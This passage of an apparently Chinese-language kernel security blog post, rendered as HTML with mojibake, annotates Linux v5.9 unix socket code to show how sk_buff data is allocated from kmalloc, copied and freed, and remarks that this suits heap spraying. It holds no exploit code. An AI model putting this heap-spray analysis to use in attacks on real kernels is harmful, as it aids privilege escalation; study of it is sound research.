class="line">	scm_destroy(&amp;scm);</span><br><span class="line">	<span class="keyword">return</span> sent ? : err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="A-å†…å­˜ç”³è¯·-1"   >
          <a href="#A-å†…å­˜ç”³è¯·-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-å†…å­˜ç”³è¯·-1" class="headerlink" title="A.å†…å­˜ç”³è¯·"></a>A.å†…å­˜ç”³è¯·</h5>
      <p>å…ˆè¿›è¡Œç›¸å…³å†…å­˜ç”³è¯·ï¼Œå³<code>sock_alloc_send_pskb() -&gt; alloc_skb_with_frags() -&gt; alloc_skb() -&gt; __alloc_skb()</code></p>
<p>è¿˜æ˜¯æŒºé•¿çš„ï¼Œä½†æ˜¯æœ€é‡è¦çš„è¿˜æ˜¯æœ€åçš„<code>__alloc_skb</code>å‡½æ•°ï¼Œ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *__<span class="title">alloc_skb</span>(<span class="title">unsigned</span> <span class="title">int</span> <span class="title">size</span>, <span class="title">gfp_t</span> <span class="title">gfp_mask</span>,</span></span><br><span class="line"><span class="class">			    <span class="title">int</span> <span class="title">flags</span>, <span class="title">int</span> <span class="title">node</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">cache</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info</span> *<span class="title">shinfo</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb</span>;</span></span><br><span class="line">	u8 *data;</span><br><span class="line">	<span class="keyword">bool</span> pfmemalloc;</span><br><span class="line"></span><br><span class="line">	cache = (flags &amp; SKB_ALLOC_FCLONE)</span><br><span class="line">		? skbuff_fclone_cache : skbuff_head_cache;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sk_memalloc_socks() &amp;&amp; (flags &amp; SKB_ALLOC_RX))</span><br><span class="line">		gfp_mask |= __GFP_MEMALLOC;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Get the HEAD */</span></span><br><span class="line">    <span class="comment">//ä»ä¸“é—¨çš„ç¼“å­˜æ± skbuff_fclone_cache/skbuff_head_cacheä¸­ç”³è¯·å†…å­˜</span></span><br><span class="line">    <span class="comment">//ä½œä¸ºå¤´éƒ¨çš„ç®¡ç†ç»“æ„</span></span><br><span class="line">	skb = kmem_cache_alloc_node(cache, gfp_mask &amp; ~__GFP_DMA, node);</span><br><span class="line">	<span class="keyword">if</span> (!skb)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	<span class="comment">//......</span></span><br><span class="line">    <span class="comment">//å…ˆå¯¹é½ï¼Œè¿™ä¸ªå’ŒL1_CACHE_BYTESæœ‰å…³,64ä½ç³»ç»Ÿå³å’Œ64(0x40)å¯¹é½,32ä½ç±»ä¼¼ï¼Œå…·ä½“çš„è¿˜æ˜¯æŸ¥ä¸€ä¸‹æœ€å¥½</span></span><br><span class="line">	size = SKB_DATA_ALIGN(size);</span><br><span class="line">    <span class="comment">//size += å¯¹é½ä¹‹åçš„0x140</span></span><br><span class="line">    <span class="comment">//é‚£ä¹ˆsizeåªå¯èƒ½æ˜¯0x140+n*0x40,æœ€ä½ä¸º0x180,å±äºkmalloc-512</span></span><br><span class="line">	size += SKB_DATA_ALIGN(<span class="keyword">sizeof</span>(struct skb_shared_info));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//è™½ç„¶æ˜¯kmalloc_reserveå‡½æ•°ï¼Œä½†æ˜¯æœ€ç»ˆè¿˜æ˜¯kmallocå½¢å¼</span></span><br><span class="line">    <span class="comment">//è°ƒç”¨åˆ°`__kmalloc_node_track_caller`å‡½æ•°è¿›è¡Œåˆ†é…</span></span><br><span class="line">    <span class="comment">//è¿™ä¸ªdataå³ä¸ºæˆ‘ä»¬å®é™…çš„å­˜å‚¨æ•°æ®çš„åœ°æ–¹,ä¹Ÿæ˜¯ä»kmallocç”³è¯·å‡ºçš„å †å—</span></span><br><span class="line">    <span class="comment">//å¹¶ä¸”æ˜¯ä»å¯¹å¼€çš„å¼€å¤´ä½ç½®å¤„å¼€å§‹å­˜å‚¨,å®Œæˆå†…å­˜ç”³è¯·åè¿”å›unix_stream_sendmsgå‡½æ•°</span></span><br><span class="line">    <span class="comment">//åœ¨`skb_copy_datagram_from_iter`å‡½æ•°ä¸­æ•°æ®ä¼šè¢«å¤åˆ¶</span></span><br><span class="line">	data = kmalloc_reserve(size, gfp_mask, node, &amp;pfmemalloc);</span><br><span class="line">	<span class="keyword">if</span> (!data)</span><br><span class="line">		<span class="keyword">goto</span> nodata;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	size = SKB_WITH_OVERHEAD(ksize(data));</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">    <span class="comment">//åˆå§‹åŒ–å¤´éƒ¨çš„ç®¡ç†ç»“æ„</span></span><br><span class="line">	<span class="built_in">memset</span>(skb, <span class="number">0</span>, offsetof(struct sk_buff, tail));</span><br><span class="line">	<span class="comment">/* Account for allocated memory : skb + skb-&gt;head */</span></span><br><span class="line">	skb-&gt;truesize = SKB_TRUESIZE(size);</span><br><span class="line">	skb-&gt;pfmemalloc = pfmemalloc;</span><br><span class="line">	refcount_set(&amp;skb-&gt;users, <span class="number">1</span>);</span><br><span class="line">	skb-&gt;head = data;</span><br><span class="line">	skb-&gt;data = data;</span><br><span class="line">	skb_reset_tail_pointer(skb);</span><br><span class="line">	skb-&gt;end = skb-&gt;tail + size;</span><br><span class="line">	skb-&gt;mac_header = (typeof(skb-&gt;mac_header))~<span class="number">0U</span>;</span><br><span class="line">	skb-&gt;transport_header = (typeof(skb-&gt;transport_header))~<span class="number">0U</span>;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> skb;</span><br><span class="line">nodata:</span><br><span class="line">	kmem_cache_free(cache, skb);</span><br><span class="line">	skb = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h6 id="å†…å­˜ç”³è¯·æ€»ç»“ï¼š-1"   >
          <a href="#å†…å­˜ç”³è¯·æ€»ç»“ï¼š-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#å†…å­˜ç”³è¯·æ€»ç»“ï¼š-1" class="headerlink" title="å†…å­˜ç”³è¯·æ€»ç»“ï¼š"></a>å†…å­˜ç”³è¯·æ€»ç»“ï¼š</h6>
      <ul>
<li><code>sk_buff</code>ä¸ºæ•°æ®çš„ç®¡ç†ç»“æ„ä»ä¸“é—¨çš„ç¼“å­˜æ± <code>skbuff_fclone_cache/skbuff_head_cache</code>ä¸­ç”³è¯·å†…å­˜ï¼Œæ²¡åŠæ³•è¿›è¡Œæ§åˆ¶</li>
<li><code>skb-&gt;data</code>ä¸ºå®é™…çš„æ•°æ®ç»“æ„<ul>
<li><code>size</code>ï¼š<code>0x140+n*0x40</code>(0x40çš„å€æ•°è¡¥é½)ã€‚å³å¦‚æœä¼ å…¥çš„æ•°æ®é•¿åº¦ä¸º0x3fï¼Œåˆ™nä¸º1ï¼Œä¼ å…¥æ•°æ®ä¸º0x41ï¼Œåˆ™nä¸º2ã€‚</li>
<li>å †å—ç”³è¯·ï¼šèµ°<code>kmalloc</code>è¿›è¡Œç”³è¯·ï¼Œæ¯”è¾ƒå¸¸è§çš„ç§ç±»ï¼Œæ–¹ä¾¿å †å–·ã€‚</li>
</ul>
</li>
<li>æ¯è°ƒç”¨<code>wirte</code>å‡½æ•°å†™å…¥ä¸€æ¬¡æ•°æ®ï¼Œéƒ½ä¼šèµ°ä¸€éæµç¨‹ï¼Œç”³è¯·æ–°çš„<code>sk_buff</code>å’Œ<code>skb-&gt;data</code>ï¼Œä¸åŒæ¶ˆæ¯ä¹‹é—´ç›¸äº’ç‹¬ç«‹ã€‚</li>
</ul>

        <h5 id="B-æ•°æ®å¤åˆ¶-1"   >
          <a href="#B-æ•°æ®å¤åˆ¶-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-æ•°æ®å¤åˆ¶-1" class="headerlink" title="B.æ•°æ®å¤åˆ¶"></a>B.æ•°æ®å¤åˆ¶</h5>
      <p>ç›¸å…³å†…å­˜ç”³è¯·å®Œæˆä¹‹åï¼Œå›åˆ°<code>unix_stream_sendmsg</code>å‡½æ•°ï¼Œå¼€å§‹è¿›è¡Œæ•°æ®å¤åˆ¶<code>skb_copy_datagram_from_iter</code>ï¼Œå³ä¸Šè¿°æåˆ°çš„ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/datagram.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">skb_copy_datagram_from_iter</span><span class="params">(struct sk_buff *skb, <span class="keyword">int</span> offset,</span></span></span><br><span class="line"><span class="params"><span class="function">                                struct iov_iter *from,</span></span></span><br><span class="line"><span class="params"><span class="function">                                <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> start = skb_headlen(skb);			<span class="comment">// skb-&gt;len - skb-&gt;data_len;</span></span><br><span class="line">    <span class="keyword">int</span> i, copy = start - offset;			<span class="comment">// copy æ˜¯çº¿æ€§æ•°æ®åŒºçš„å‰©ä½™ç©ºé—´å¤§å°</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">frag_iter</span>;</span></span><br><span class="line">    <span class="comment">//æ‹·è´åˆ°ç”³è¯·çš„ä¿å­˜æ•°æ®çš„å †å—skb-&gt;data</span></span><br><span class="line">    <span class="keyword">if</span> (copy &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (copy &gt; len)</span><br><span class="line">            copy = len;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_iter(skb-&gt;data + offset, copy, from) != copy)</span><br><span class="line">            <span class="keyword">goto</span> fault;</span><br><span class="line">        <span class="keyword">if</span> ((len -= copy) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        offset += copy;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¡é‡Šæ”¾-4"   >
          <a href="#â‘¡é‡Šæ”¾-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é‡Šæ”¾-4" class="headerlink" title="â‘¡é‡Šæ”¾"></a>â‘¡é‡Šæ”¾</h4>
      <p>å½“ä»<code>socker</code>å¥—æ¥å­—ä¸­è¯»å–å‡ºæŸæ¡ä¿¡æ¯çš„æ‰€æœ‰æ•°æ®æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¯¥æ¡ä¿¡æ¯çš„ç›¸å…³å†…å­˜çš„é‡Šæ”¾ï¼Œå³è¯¥æ¡ä¿¡æ¯å¯¹åº”<code>sk_buff</code>å’Œ<code>skb-&gt;data</code>çš„é‡Šæ”¾ã€‚åŒæ ·çš„ï¼Œå¦‚æœè¯¥æ¡ä¿¡æ¯æ²¡æœ‰è¢«è¯»å–å®Œæ¯•ï¼Œåˆ™ä¸ä¼šå‘ç”Ÿè¯¥ä¿¡æ¯ç›¸å…³å†…å­˜çš„é‡Šæ”¾ã€‚</p>
<p>åœ¨<code>read</code>æ—¶è¿›è¡Œçš„å‡½æ•°è°ƒç”¨é“¾ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read -&gt; ksys_read() -&gt; vfs_read() -&gt; new_sync_read() -&gt; call_read_iter() -&gt; sock_read_iter() -&gt; sock_recvmsg() -&gt; sock_recvmsg_nosec() -&gt; unix_stream_recvmsg() -&gt; unix_stream_read_generic()</span><br></pre></td></tr></table></div></figure>

<p>åŒæ ·çš„åœ¨<code>unix_stream_read_generic</code>å¤„å¼€å§‹åˆ†å‰ï¼Œä¹Ÿæ˜¯åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œä¸‹é¢æˆªå–é‡è¦éƒ¨åˆ†</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/unix/af_unix.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">unix_stream_read_generic</span><span class="params">(struct unix_stream_read_state *state,</span></span></span><br><span class="line"><span class="params"><span class="function">				    <span class="keyword">bool</span> freezable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">		chunk = <span class="keyword">min_t</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span>, unix_skb_len(skb) - skip, size);</span><br><span class="line">		skb_get(skb);</span><br><span class="line">        <span class="comment">//------------------åˆ†å‰ä¸€:æ•°æ®å¤åˆ¶</span></span><br><span class="line">        <span class="comment">//recv_actorå‡½æ•°æŒ‡é’ˆæ˜¯åœ¨unix_stream_recvmsgå‡½æ•°ä¸­å®šä¹‰çš„stateå‡½æ•°è¡¨</span></span><br><span class="line">        <span class="comment">//è¯¥å‡½æ•°æŒ‡é’ˆå¯¹åº”unix_stream_read_actorå‡½æ•°,å³ä»è¿™å¼€å§‹è¿›è¡Œæ•°æ®å¤åˆ¶</span></span><br><span class="line">		chunk = state-&gt;recv_actor(skb, skip, chunk, state);</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        <span class="comment">//ä¼ è¾“æ•°æ®å®Œæˆä¹‹å,skb-&gt;usersä»2æ”¹ä¸º1,è¡¨ç¤ºå·²ç»å¤åˆ¶å®Œæ•°æ®äº†,æ–¹ä¾¿åç»­åˆ¤æ–­</span></span><br><span class="line">        <span class="comment">//æ¶ˆæ¯ä¸­æ˜¯å¦è¿˜æœ‰æ•°æ®</span></span><br><span class="line">		consume_skb(skb);</span><br><span class="line">		<span class="keyword">if</span> (chunk &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (copied == <span class="number">0</span>)</span><br><span class="line">				copied = -EFAULT;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		copied += chunk;</span><br><span class="line">		size -= chunk;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Mark read part of skb as used */</span></span><br><span class="line">		<span class="keyword">if</span> (!(flags &amp; MSG_PEEK)) &#123;</span><br><span class="line">            <span class="comment">//ä¿®æ”¹skbç±»å‹è½¬æ¢ä¹‹åå¯¹åº”çš„consumedå­—æ®µ,å…¶å®å°±æ˜¯skb-&gt;cbæŸä¸ªä½ç½®å¤„çš„æ•°æ®</span></span><br><span class="line">            <span class="comment">//#define UNIXCB(skb)	(*(struct unix_skb_parms *)&amp;((skb)-&gt;cb))</span></span><br><span class="line">			UNIXCB(skb).consumed += chunk;</span><br><span class="line">			<span class="comment">//ä¾æ®ä¸Šé¢çš„consumedå’Œlenæ¥åˆ¤æ–­æ¶ˆæ¯ä¸­æ˜¯å¦è¿˜å‰©ä¸‹æ²¡æœ‰ä¼ è¾“çš„æ•°æ®</span></span><br><span class="line">            <span class="comment">//æœ‰(1)åˆ™break,æ— (0)åˆ™è¿›å…¥åç»­çš„å†…å­˜é‡Šæ”¾é˜¶æ®µ</span></span><br><span class="line">			<span class="keyword">if</span> (unix_skb_len(skb))</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//------------------------åˆ†å‰äºŒ:å†…å­˜é‡Šæ”¾</span></span><br><span class="line">            <span class="comment">//å†…å­˜é‡Šæ”¾å‰ç½®å·¥ä½œ</span></span><br><span class="line">			skb_unlink(skb, &amp;sk-&gt;sk_receive_queue);</span><br><span class="line">            <span class="comment">//è¿›å…¥è¯¥å‡½æ•°,é€šè¿‡å¯¹äºskb-&gt;usersçš„åˆ¤æ–­ä¹‹å,è¿›å…¥å†…å­˜é‡Šæ”¾é˜¶æ®µ</span></span><br><span class="line">			consume_skb(skb);</span><br><span class="line">            <span class="comment">//....................</span></span><br><span class="line">	&#125; <span class="keyword">while</span> (size);</span><br><span class="line">        <span class="comment">//......................</span></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> copied ? : err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h5 id="A-æ•°æ®å¤åˆ¶"   >
          <a href="#A-æ•°æ®å¤åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-æ•°æ®å¤åˆ¶" class="headerlink" title="A.æ•°æ®å¤åˆ¶"></a>A.æ•°æ®å¤åˆ¶</h5>
      <p>ä¹‹åçš„å‡½æ•°è°ƒç”¨é“¾ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unix_stream_read_actor() -&gt; skb_copy_datagram_msg() -&gt; skb_copy_datagram_iter() -&gt; __skb_datagram_iter()</span><br></pre></td></tr></table></div></figure>

<p>æœ€ç»ˆè¿›å…¥<code>__skb_datagram_iter</code>ï¼Œ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/datagram.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __skb_datagram_iter(<span class="keyword">const</span> struct sk_buff *skb, <span class="keyword">int</span> offset,</span><br><span class="line">			       struct iov_iter *to, <span class="keyword">int</span> len, <span class="keyword">bool</span> fault_short,</span><br><span class="line">			       <span class="keyword">size_t</span> (*cb)(<span class="keyword">const</span> <span class="keyword">void</span> *, <span class="keyword">size_t</span>, <span class="keyword">void</span> *,</span><br><span class="line">					    struct iov_iter *), <span class="keyword">void</span> *data)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> start = skb_headlen(skb);</span><br><span class="line">	<span class="keyword">int</span> i, copy = start - offset, start_off = offset, n;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">frag_iter</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Copy header. */</span></span><br><span class="line">    <span class="comment">//è¿™ä¸ªheaderæŒ‡çš„å°±æ˜¯æ•°æ®data,å¤§æ¦‚å°±æ˜¯ä»è¿™é‡Œå¼€å§‹å®é™…çš„æ•°æ®</span></span><br><span class="line">	<span class="keyword">if</span> (copy &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (copy &gt; len)</span><br><span class="line">			copy = len;</span><br><span class="line">		n = INDIRECT_CALL_1(cb, simple_copy_to_iter,</span><br><span class="line">				    skb-&gt;data + offset, copy, data, to);</span><br><span class="line">		offset += n;</span><br><span class="line">		<span class="keyword">if</span> (n != copy)</span><br><span class="line">			<span class="keyword">goto</span> short_copy;</span><br><span class="line">		<span class="keyword">if</span> ((len -= copy) == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">/* Copy paged appendix. Hmm... why does this look so complicated? */</span></span><br><span class="line">    <span class="comment">//linuxå†…æ ¸ç»´æŠ¤äººå‘˜éƒ½çœ‹ä¸ä¸‹å»äº†,xs</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œä½¿ç”¨äº†æ„Ÿè§‰å¾ˆå¤æ‚çš„æœºåˆ¶ï¼Œä¸æ˜¯å¾ˆæ‡‚ã€‚</p>

        <h5 id="B-å†…å­˜é‡Šæ”¾"   >
          <a href="#B-å†…å­˜é‡Šæ”¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-å†…å­˜é‡Šæ”¾" class="headerlink" title="B.å†…å­˜é‡Šæ”¾"></a>B.å†…å­˜é‡Šæ”¾</h5>
      <p>è¿›å…¥å†…å­˜é‡Šæ”¾çš„å‡½æ•°è°ƒç”¨é“¾ä¸º</p>
<ul>
<li><p>é‡Šæ”¾<code>skb-&gt;data</code>éƒ¨åˆ†ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">consume_skb()-&gt;__kfree_skb()-&gt;skb_release_all()-&gt;skb_release_all()-&gt;skb_release_data()-&gt;skb_free_head()</span><br></pre></td></tr></table></div></figure>

<p>å¯¹åº”å‡½æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">skb_free_head</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//å…¶å®headå’Œdataæ˜¯ä¸€æ ·çš„</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *head = skb-&gt;head;</span><br><span class="line">	<span class="keyword">if</span> (skb-&gt;head_frag) &#123;</span><br><span class="line">		<span class="keyword">if</span> (skb_pp_recycle(skb, head))</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		skb_free_frag(head);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		kfree(head);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å¯ä»¥çœ‹åˆ°ä½¿ç”¨çš„æ­£å¸¸çš„<code>kfree</code>å‡½æ•°</p>
</li>
<li><p>é‡Šæ”¾<code>skb</code>éƒ¨åˆ†ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">consume_skb()-&gt;__kfree_skb()-&gt;kfree_skbmem()</span><br></pre></td></tr></table></div></figure>

<p>ç›¸å…³å‡½æ•°å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/core/skbuff.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">kfree_skbmem</span><span class="params">(struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sk_buff_fclones</span> *<span class="title">fclones</span>;</span></span><br><span class="line">    <span class="comment">//å…‹éš†ä½“ç›¸å…³çš„,æ²¡æœ‰forkä¹‹ç±»çš„è¯ä¸€èˆ¬ä¸ç”¨å¤ªç®¡çš„</span></span><br><span class="line">    <span class="keyword">switch</span> (skb-&gt;fclone) &#123;</span><br><span class="line">        <span class="keyword">case</span> SKB_FCLONE_UNAVAILABLE:</span><br><span class="line">            <span class="comment">//ç”¨ä¸“é—¨çš„cache(skbuff_head_cache)è¿›è¡Œå›æ”¶</span></span><br><span class="line">            kmem_cache_free(skbuff_head_cache, skb);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> SKB_FCLONE_ORIG:</span><br><span class="line">            fclones = container_of(skb, struct sk_buff_fclones, skb1);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* We usually free the clone (TX completion) before original skb</span></span><br><span class="line"><span class="comment">		 * This test would have no chance to be true for the clone,</span></span><br><span class="line"><span class="comment">		 * while here, branch prediction will be good.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">            <span class="keyword">if</span> (refcount_read(&amp;fclones-&gt;fclone_ref) == <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">goto</span> fastpath;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>: <span class="comment">/* SKB_FCLONE_CLONE */</span></span><br><span class="line">            fclones = container_of(skb, struct sk_buff_fclones, skb2);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!refcount_dec_and_test(&amp;fclones-&gt;fclone_ref))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">fastpath:</span><br><span class="line">    <span class="comment">//ç”¨ä¸“é—¨çš„cache(skbuff_fclone_cache)è¿›è¡Œå›æ”¶å…‹éš†çš„skb</span></span><br><span class="line">    kmem_cache_free(skbuff_fclone_cache, fclones);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªå°±ä¸å¤ªå¥½åˆ©ç”¨äº†ã€‚</p>
